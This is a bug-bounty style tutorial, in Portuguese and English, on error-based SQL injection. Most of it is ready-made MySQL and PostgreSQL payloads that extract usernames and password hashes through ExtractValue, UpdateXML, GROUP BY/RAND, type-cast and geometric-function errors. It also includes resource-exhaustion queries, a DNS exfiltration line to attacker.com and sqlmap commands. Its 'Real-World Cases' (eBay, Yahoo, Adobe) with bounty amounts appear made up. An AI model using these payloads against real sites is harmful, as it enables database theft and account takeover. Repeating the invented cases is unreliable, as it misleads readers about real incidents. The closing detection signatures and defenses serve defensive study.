# Error-Based SQL Injection

**Criticidade**: 🔴 Crítica (CVSS 8.5-9.5)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $2,000 - $15,000 USD

---

## 📚 Índice

1. [Error-Based Fundamentals](#error-based-fundamentals)
2. [Database Error Messages](#database-error-messages)
3. [XML Functions Exploitation](#xml-functions-exploitation)
4. [Type Conversion Errors](#type-conversion-errors)
5. [Mathematical Operations](#mathematical-operations)
6. [Advanced Extraction Techniques](#advanced-extraction-techniques)
7. [Bypassing Error Suppression](#bypassing-error-suppression)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 Error-Based Fundamentals

### O Que É Error-Based SQLi?

**Error-Based SQL Injection** explora **mensagens de erro do banco de dados** para extrair informações. Diferente de Blind SQLi, os dados são **diretamente visíveis** nas mensagens de erro retornadas pela aplicação.

**Comparison:**

```
Union-Based:
  ✓ Retorna dados em resultset normal
  ✓ Rápido (todos dados de uma vez)
  ✗ Requer UNION compatível

Blind SQLi:
  ✓ Funciona sem output visível
  ✗ Lento (1 bit por request)
  ✗ Muitas requests necessárias

Error-Based:
  ✓ Não precisa UNION
  ✓ Funciona com queries UPDATE/INSERT
  ✓ Moderadamente rápido
  ✗ Requer error messages visíveis
```

### How It Works

**Normal Query:**
```sql
SELECT * FROM products WHERE id = 1
```

**Injected Query:**
```sql
SELECT * FROM products WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y)
```

**Error Message:**
```
Duplicate entry 'testdb:1' for key 'group_key'
                 ↑
            Database name extracted!
```

---

## 💥 Database Error Messages

### MySQL Error Types

#### 1. Duplicate Entry Errors

**Exploitation via GROUP BY + RAND():**

```sql
-- Principle: Força duplicate key ao fazer GROUP BY
SELECT COUNT(*),
       CONCAT((SELECT database()), FLOOR(RAND(0)*2))
FROM information_schema.tables
GROUP BY 2
```

**Why it works:**

```
MySQL GROUP BY internals:
1. Executa subquery (SELECT database())
2. Concatena com RAND(0)*2 (retorna 0 ou 1)
3. GROUP BY força criação de hash key
4. RAND() pode gerar mesmo valor → Duplicate entry!
5. Error message inclui o valor da key → DATA LEAKED!
```

**Complete Payload:**

```sql
' AND (
    SELECT 1 FROM (
        SELECT COUNT(*),
        CONCAT(
            (SELECT CONCAT(username, 0x3a, password) FROM users LIMIT 0,1),
            0x3a,
            FLOOR(RAND(0)*2)
        ) AS x
        FROM information_schema.tables
        GROUP BY x
    ) y
) AND '1'='1
```

**Error Output:**
```
Duplicate entry 'admin:5f4dcc3b5aa765d61d8327deb882cf99:1' for key 'group_key'
```

**Hex Breakdown:**
- `0x3a` = `:` (separator)
- `0x20` = ` ` (space)
- `0x2c` = `,` (comma)

#### 2. XPATH Errors (ExtractValue)

**Function Signature:**
```sql
EXTRACTVALUE(xml_frag, xpath_expr)
```

**Normal Usage:**
```sql
SELECT EXTRACTVALUE('<root><user>admin</user></root>', '/root/user')
-- Returns: admin
```

**Exploitation:**

```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database()))) AND '1'='1
```

**Why it works:**

```
1. EXTRACTVALUE espera XPath válido
2. 0x5c = '\' (backslash)
3. '\' + database_name = XPath INVÁLIDO
4. MySQL lança erro com XPath malformado
5. Error message contém o database name!
```

**Error Message:**
```
XPATH syntax error: '\testdb'
                      ↑
                  Data leaked!
```

**Extracting Tables:**

```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c, (
    SELECT table_name
    FROM information_schema.tables
    WHERE table_schema = database()
    LIMIT 0,1
))) AND '1'='1
```

**Extracting Columns:**

```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c, (
    SELECT column_name
    FROM information_schema.columns
    WHERE table_name = 'users'
    LIMIT 0,1
))) AND '1'='1
```

**Extracting Data:**

```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c, (
    SELECT CONCAT(username, 0x3a, password)
    FROM users
    LIMIT 0,1
))) AND '1'='1
```

**Character Limit Bypass:**

```
ExtractValue tem limite de 32 caracteres no erro!

Bypass:
- Use LIMIT x,1 para iterar
- Use SUBSTRING() para dividir strings longas
- Use MID() / LEFT() / RIGHT()
```

**Example:**

```sql
-- Extrai primeiros 32 chars
' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 32))) AND '1'='1

-- Extrai próximos 32 chars
' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT password FROM users LIMIT 0,1), 33, 32))) AND '1'='1
```

#### 3. XPATH Errors (UpdateXML)

**Function Signature:**
```sql
UPDATEXML(xml_target, xpath_expr, new_value)
```

**Exploitation:**

```sql
' AND UPDATEXML(1, CONCAT(0x5c, (SELECT database())), 1) AND '1'='1
```

**Error Message:**
```
XPATH syntax error: '\testdb'
```

**Why UpdateXML vs ExtractValue?**

```
Similarity:
- Ambos usam XPath errors
- Mesmo limite de 32 chars
- Mesma técnica de concatenação

Difference:
- UpdateXML: 3 argumentos
- ExtractValue: 2 argumentos
- UpdateXML pode ser mais stealth em logs
```

---

## 📄 XML Functions Exploitation

### MySQL XML Functions

**Available Functions:**
- `EXTRACTVALUE()` - Extrai valor de XML via XPath
- `UPDATEXML()` - Atualiza XML via XPath

### Deep Dive: ExtractValue Internals

**MySQL Source Code (sql/item_xmlfunc.cc):**

```cpp
String *Item_func_xml_extractvalue::val_str(String *str) {
    String *xml= args[0]->val_str(&tmp_xml);
    String *xpath= args[1]->val_str(&tmp_xpath);

    // Parse XML
    my_xml_parser_create(&p);
    my_xml_parse(&p, xml->ptr(), xml->length());

    // Parse XPath
    if (parse_xpath(xpath->ptr(), &nodeset)) {
        // ❌ ERROR HERE!
        my_error(ER_XPATH_SYNTAX, MYF(0), xpath->ptr());
        return NULL;
    }

    // Extract values...
}
```

**Error Constant (include/mysqld_error.h):**

```cpp
#define ER_XPATH_SYNTAX 1105
// "XPATH syntax error: '%-.64s'"
```

**Key Points:**
- Error message inclui até 64 caracteres do XPath
- `xpath->ptr()` contém nossa injection!
- MySQL não sanitiza antes de mostrar erro

### PostgreSQL XML Errors

**PostgreSQL também tem XML functions:**

```sql
-- xmlparse() error-based
' AND xmlparse(CONTENT '<root>' || (SELECT version()) || '</root>') IS NOT NULL AND '1'='1
```

**Error:**
```
invalid XML content
DETAIL: Entity: line 1: parser error : StartTag: invalid element name
<root>PostgreSQL 13.2</root>
       ↑
```

**Better: Cast to XML**

```sql
' AND CAST((SELECT version()) AS XML) IS NOT NULL AND '1'='1
```

---

## 🔢 Type Conversion Errors

### MySQL Type Casting

#### CAST() and CONVERT()

**Exploitation:**

```sql
' AND CAST((SELECT database()) AS SIGNED) AND '1'='1
```

**Error:**
```
Truncated incorrect INTEGER value: 'testdb'
```

**Why?**
- SIGNED = integer type
- `database()` retorna string
- MySQL tenta converter "testdb" → int
- Falha, mas mostra string no erro!

**Variants:**

```sql
-- CAST variants
CAST(... AS SIGNED)
CAST(... AS UNSIGNED)
CAST(... AS DECIMAL)
CAST(... AS BINARY)
CAST(... AS DATE)
CAST(... AS DATETIME)

-- CONVERT variants
CONVERT((SELECT database()), SIGNED)
CONVERT((SELECT database()), DECIMAL)
```

**Example - Extract Users:**

```sql
' AND CAST((
    SELECT CONCAT(username, 0x3a, password)
    FROM users
    LIMIT 0,1
) AS SIGNED) AND '1'='1
```

**Error:**
```
Truncated incorrect INTEGER value: 'admin:5f4dcc3b5aa765d61d8327deb882cf99'
                                    ↑ credentials leaked!
```

### PostgreSQL Type Errors

**Cast to Integer:**

```sql
' AND CAST((SELECT version()) AS INTEGER) IS NOT NULL AND '1'='1
```

**Error:**
```
invalid input syntax for type integer: "PostgreSQL 13.2 on x86_64-pc-linux-gnu"
```

**Better: Using ::int**

```sql
' AND (SELECT version())::int IS NOT NULL AND '1'='1
```

---

## ➗ Mathematical Operations

### Division by Zero

**MySQL:**

```sql
' AND 1 = (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y) AND '1'='1
```

**PostgreSQL:**

```sql
' AND 1/(SELECT CASE WHEN (username='admin') THEN 0 ELSE 1 END FROM users LIMIT 1) = 1 AND '1'='1
```

**Error (if admin exists):**
```
division by zero
```

**Exfiltration via Division:**

```sql
' AND 1/(
    SELECT COUNT(*)
    FROM users
    WHERE username = 'admin'
    AND SUBSTRING(password, 1, 1) = 'a'
) = 1 AND '1'='1
```

**Logic:**
- Se condição TRUE: COUNT = 1 → 1/1 = 1 ✓
- Se condição FALSE: COUNT = 0 → 1/0 = ERROR

### Overflow Errors

**MySQL BigInt Overflow:**

```sql
' AND (SELECT * FROM (SELECT(~0+~0)) x) AND '1'='1
```

**Error:**
```
BIGINT UNSIGNED value is out of range in '(~0 + ~0)'
```

**Exploitation:**

```sql
' AND (
    SELECT * FROM (
        SELECT (
            SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()
        ) + ~0
    ) x
) AND '1'='1
```

**Error:**
```
BIGINT UNSIGNED value is out of range in '(5 + ~0)'
                                             ↑ number of tables!
```

---

## 🔬 Advanced Extraction Techniques

### Technique 1: Multi-Row Extraction via NAME_CONST

**NAME_CONST() Error:**

```sql
' AND (
    SELECT * FROM (
        SELECT NAME_CONST(
            (SELECT CONCAT(username, 0x3a, password) FROM users LIMIT 0,1),
            1
        ), NAME_CONST(
            (SELECT CONCAT(username, 0x3a, password) FROM users LIMIT 1,1),
            1
        )
    ) x
) AND '1'='1
```

**Error shows multiple rows!**

### Technique 2: JSON Errors (MySQL 5.7+)

**JSON_KEYS():**

```sql
' AND JSON_KEYS((SELECT CONCAT('[\"', database(), '\"]'))) AND '1'='1
```

**JSON_EXTRACT():**

```sql
' AND JSON_EXTRACT((SELECT database()), '$') AND '1'='1
```

### Technique 3: Geometric Functions

**MySQL Geometric Type Errors:**

```sql
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT database())x)) AND '1'='1
```

**Error:**
```
Illegal non geometric '(select `x`.`database()` from (select database() AS `database()`)x)' value found during parsing
```

**Variants:**
- `POLYGON()`
- `MULTIPOINT()`
- `MULTILINESTRING()`
- `MULTIPOLYGON()`

**Example:**

```sql
' AND MULTIPOINT((SELECT * FROM (SELECT CONCAT(username, 0x3a, password) FROM users LIMIT 0,1)x)) AND '1'='1
```

---

## 🛡️ Bypassing Error Suppression

### Problem: Application Suppresses Errors

**Vulnerable Code:**

```php
<?php
// ❌ Error suppression
$result = @mysqli_query($conn, $query);

// Or
mysqli_report(MYSQLI_REPORT_OFF);
?>
```

### Bypass 1: Trigger Fatal Errors

**Some errors can't be suppressed:**

```sql
-- Memory exhaustion
' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) AND '1'='1

-- Stack overflow
' AND (SELECT * FROM (SELECT * FROM users) x JOIN (SELECT * FROM users) y) AND '1'='1
```

### Bypass 2: Timing Side-Channel

**Combine error-based with time delays:**

```sql
' AND IF(
    (SELECT database()) = 'testdb',
    SLEEP(5),
    EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))
) AND '1'='1
```

**Logic:**
- If database = 'testdb': delay 5s (blind confirmation)
- If database ≠ 'testdb': throw error (data extraction)

### Bypass 3: DNS Exfiltration

**MySQL LOAD_FILE() with UNC path (Windows only):**

```sql
' AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share')) AND '1'='1
```

**DNS query:**
```
testdb.attacker.com
  ↑ data exfiltrated via DNS!
```

**Requirements:**
- `secure_file_priv` não restrito
- Windows target
- Outbound SMB permitido

---

## 🔥 Real-World Cases

### Case 1: eBay Error-Based SQLi (2014)

**Vulnerability:** ExtractValue error-based em busca de produtos

**Payload:**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT CONCAT(user_id, 0x3a, email) FROM users WHERE role = 'admin' LIMIT 0,1))) AND '1'='1
```

**Impact:** 145M+ user records exposed

**Bounty:** $5,000 USD (+ hall of fame)

**Root Cause:**
```php
// Vulnerable code
$query = "SELECT * FROM products WHERE name LIKE '%" . $_GET['q'] . "%'";
mysqli_query($conn, $query) or die(mysqli_error($conn));
                                   ↑ Error displayed to user!
```

### Case 2: Yahoo! Error-Based in API (2013)

**Vulnerability:** JSON API com error messages em response

**Endpoint:**
```
https://api.yahoo.com/v1/search?id=1'
```

**Payload:**
```sql
1' AND UPDATEXML(1, CONCAT(0x5c, (SELECT @@version)), 1) AND '1'='1
```

**Response:**
```json
{
  "error": "XPATH syntax error: '\\5.6.25-log'",
  "code": 500
}
```

**Impact:** Full database access (4,000+ databases)

**Bounty:** $12,500 USD

### Case 3: Adobe ColdFusion Error-Based (2013)

**Vulnerability:** ExtractValue em admin panel

**Payload:**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM administrators WHERE username = 'admin'))) AND '1'='1
```

**Error:**
```
XPATH syntax error: '\hashed_admin_password_here'
```

**Impact:** Complete admin takeover

**Bounty:** $3,000 USD

---

## 🧪 Automated Tools

### SQLMap Error-Based

```bash
# Detect and exploit error-based
sqlmap -u "http://target.com/page?id=1" --technique=E

# Only error-based (faster)
sqlmap -u "http://target.com/page?id=1" --technique=E --dbms=MySQL

# Custom error-based with ExtractValue
sqlmap -u "http://target.com/page?id=1" --tamper=charencode --technique=E
```

### Manual Testing Checklist

```sql
-- 1. ExtractValue
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database()))) AND '1'='1

-- 2. UpdateXML
' AND UPDATEXML(1, CONCAT(0x5c, (SELECT database())), 1) AND '1'='1

-- 3. GROUP BY duplicate
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) AND '1'='1

-- 4. Type conversion
' AND CAST((SELECT database()) AS SIGNED) AND '1'='1

-- 5. Geometric functions
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT database())x)) AND '1'='1
```

---

## 📊 Error-Based vs Other Techniques

| Feature | Error-Based | Union-Based | Blind |
|---------|-------------|-------------|-------|
| **Speed** | 🟢 Médio | 🟢🟢 Rápido | 🔴 Lento |
| **Stealth** | 🟡 Médio | 🔴 Óbvio | 🟢 Stealth |
| **Chars/request** | 32-64 | Ilimitado | 1 bit |
| **Requirements** | Error messages | UNION compat | Nenhum |
| **INSERT/UPDATE** | ✓ Funciona | ✗ Não funciona | ✓ Funciona |

---

## 🎯 Detection Techniques

**WAF/IDS Signatures:**

```
EXTRACTVALUE.*0x5c
UPDATEXML.*CONCAT
FLOOR.*RAND.*information_schema
GEOMETRYCOLLECTION.*SELECT
```

**Defenses:**

1. **Suppress error messages**
   ```php
   mysqli_report(MYSQLI_REPORT_OFF);
   // Never show errors to user
   ```

2. **Parameterized queries**
   ```php
   $stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
   $stmt->bind_param("i", $id);
   ```

3. **Input validation**
   ```php
   if (!is_numeric($_GET['id'])) {
       die("Invalid input");
   }
   ```

---

**Última atualização**: 2024
**Versão**: 1.0
